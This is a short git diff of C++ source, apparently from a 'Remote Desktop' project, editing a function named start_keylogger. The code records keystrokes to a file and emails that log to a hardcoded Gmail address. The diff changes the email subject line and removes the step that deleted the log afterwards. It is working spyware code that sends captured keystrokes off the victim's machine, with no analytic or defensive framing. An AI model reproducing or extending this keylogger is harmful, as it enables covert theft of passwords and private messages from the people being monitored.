@@ -87,14 +87,11 @@ void start_keylogger(const std::string& filename, int durationSeconds) {
   ifstream test_file(filename);
   if (test_file.good()) {
     test_file.close();
-    send_email_with_attachment("serverbottestmmt@gmail.com", "Keylogger Log",
-                               "Keylog data from the remote device.", filename);
+    send_email_with_attachment("serverbottestmmt@gmail.com", "[Remote Desktop] Keylogger Log",
+                               "Keylog data from the remote device:", filename);
   } else {
     cerr << "Failed to create keylog file" << endl;
   }
-
-  if (!std::filesystem::remove(filename))
-    cerr << "Failed to delete the file." << endl;
 }
 
 void run_keylogger_and_save(const std::string& outFile, int durationSeconds) {
